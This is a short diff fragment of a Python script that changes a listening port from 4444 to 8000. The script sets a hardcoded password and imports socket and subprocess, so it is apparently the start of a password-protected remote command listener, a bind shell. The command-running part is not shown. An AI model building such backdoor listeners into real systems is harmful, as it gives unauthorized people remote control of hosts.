@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 HOST = ''
-PORT = 4444
+PORT = 8000
 PASSWORD = "aidnid"
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
